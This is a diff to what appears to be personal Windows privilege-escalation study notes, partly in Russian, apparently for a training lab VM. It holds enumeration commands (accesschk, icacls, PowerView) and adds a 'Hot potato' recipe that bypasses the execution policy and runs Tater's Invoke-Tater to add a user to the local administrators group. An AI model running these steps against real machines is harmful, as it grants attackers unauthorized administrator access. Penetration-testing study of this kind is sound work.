@@ -215,6 +215,8 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc - досту
 icacls "C:\xampp\apache\bin\httpd.exe"
 icalcs "C:\xampp\mysql\bin\mysqld.exe"
 
+
+
 # Enumerate specific service
 Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode
 
@@ -287,4 +289,15 @@ Get-NetUser | select cn    (список пользователей)
 
 Get-NetGroup -GroupName *admin*   (список групп содержащих *админ*)
 
+# Hot potato
+
+
+Exploitation
+
+Windows VM
+
+1. In command prompt type: powershell.exe -nop -ep bypass
+2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
 
